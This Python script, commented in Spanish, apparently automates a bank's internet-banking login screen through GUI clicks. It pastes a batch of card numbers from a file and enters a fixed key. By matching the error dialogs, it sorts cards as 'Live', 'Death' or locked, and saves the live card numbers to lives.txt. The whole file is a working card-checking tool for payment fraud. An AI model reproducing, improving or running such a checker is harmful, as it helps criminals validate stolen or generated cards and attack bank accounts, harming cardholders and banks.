import pyautogui 
import time
import datetime
import pyperclip3 as pc

#import cv2
#import telegram

donde_escribir = 367,492 #Tarjeta
ingresar = 283,646 #pyautogui.moveTo(286,542) CLave de internt
linealote = 0
btn_reiniciarEQUIS = 461,491
btn_reiniciarArriba = 460,388
SalirSesion_SI_button = 442,593
Aceptar = 435,596

#lugar_clave = 349,552
#cancelar = 1502,994
#ok_error = 1641,614


def click (pos,click = 1 ):
	pyautogui.moveTo(pos)
	pyautogui.click(clicks=click)
		
lives = open("lives.txt","a")
print("*************************************")


print("***************")
print("Presione 'Enter' para continuar")
input()
print("\n")
print("Corriendo Bot")
print("3")
time.sleep(0.5)
print("2")
time.sleep(0.5)
print("1")
print("\n")

#print("Equis")
#click(btn_reiniciarEQUIS)
time.sleep(1)
flag2 = False

with open ('./lote.txt') as texto:
	for x in texto:
		print("------------------")
		
		linealote += 1
		flag = True
		

		#time.sleep(0.2)

		pc.copy(x)
		pyautogui.doubleClick(66,490)
		time.sleep(0.4)
		pyautogui.hotkey('ctrl', 'v') # pegando lo copiado

		if (flag2):
			print("Poniendo la clave")
			time.sleep(0.4)
			pyautogui.click(210,546)
			time.sleep(0.4)
			pyautogui.typewrite("1111111")

		#calando del 1 al 6
		registro = open("registro.txt","w")
		registro.write(str(x)) # escribir en el block
		registro.write("\n")
		registro.close()

		
		if flag2:
			print("click arriba")
			time.sleep(0.3)
			pyautogui.click(286,536) # ingresar subido

		flag2 = False
		a = None
		error1 = None
		#print(x.rstrip())
		#time.sleep(0.1)
		#print("Intentando 123456 ")

		#for j in range (1,7):
		#	buscarnumero(j)
			#print(j)

		time.sleep(0.4)
		click(ingresar)
		#print("Verificando...")
		time.sleep(0.3)

		#Confirmacion :
		#Lives
		c = None
		d = None
		e = None
		f = None

		#Moridas
		b = None
		p = None
		q = None
		r = None
		u = None
		w = None

		contadorerror = 0
		contador = 0
		fechaActual = datetime.datetime.now()
		#flag = "flag1"
		while True: # Un " Y " poqe si no cumple 1 se rompe el bucle
			generarClave = "./imagenes/generarClave.png"
			u = pyautogui.locateOnScreen(generarClave, grayscale=True, confidence=0.9, region=(71,467,429,169))
			#print("u",u)
			if u!=None:
				click(Aceptar)
				print("Usted no ha generado su clave de internet")
				break

			ClaveErronea = "./imagenes/ClaveErronea.png"
			q = pyautogui.locateOnScreen(ClaveErronea, grayscale=True, confidence=0.9, region=(71,467,429,169))
			#click(q)
			#print("Q",q)
			if q!=None:
				click(Aceptar)
				print("Limites de clave dada")
				break

			contraInco = "./imagenes/contraInco.png"
			p = pyautogui.locateOnScreen(contraInco, grayscale=True, confidence=0.9, region=(71,467,429,169))
			#click(p)
			#print("P",p)
			if p!=None:
				click(Aceptar)
				print("Contraseña Incorrecta")
				break

			inoperativa = "./imagenes/inoperativa.png"
			b = pyautogui.locateOnScreen(inoperativa, grayscale=True, confidence=0.9, region=(71,467,429,169))
			#print("B",b)
			if b!=None:
				click(Aceptar)
				print("Tarjeta inoperativa")
				break

			print("intentos")
			if contadorerror > 5: # Por si no encuyentra ninguno
				print("folse")
				flag = False
				time.sleep(0.3)
				#pyautogui.click(445,597) # click aceptar
				#time.sleep(0.5)
				#input()
				break

			contadorerror += 1

		if flag==False or (b!=None) or (u!=None):
			fechaActual2 = datetime.datetime.strftime(fechaActual,'%H:%M:%S')
			print(fechaActual2, " | ","N. ", linealote ,": ",x.rstrip()+" -------------> Death")

		if (q!=None):
			#print ('\a')
			fechaActual2 = datetime.datetime.strftime(fechaActual,'%H:%M:%S')
			print(fechaActual2, " | ","N. ", linealote ,": ",x.rstrip()+" -------------> Limite Contraseña")
			EncontrarClave = open("EncontrarClave.txt","a")
			EncontrarClave.write(x.rstrip()) #escribir en el block
			EncontrarClave.write("\n")
			EncontrarClave.close()

			time.sleep(0.3)
			pyautogui.click(445,597) # click aceptar

		if  (p!=None) : # Por si es LIVE:
			#print ('\a')
			fechaActual2 = datetime.datetime.strftime(fechaActual,'%H:%M:%S')
			print(fechaActual2, " | ","N. ", linealote ,": ",x.rstrip()+" -------------> Live")
			lives = open("lives.txt","a")
			lives.write(x.rstrip()) #escribir en el block
			lives.write("\n")
			lives.close()

		time.sleep(0.6)
		pyautogui.click(445,597) # click aceptar


		

lives.close()
print("Programa finalizado")
print("se quedo en la linea: ", linealote)
print("*****************")
print("Presione 'Enter' para Finalizar")
input()



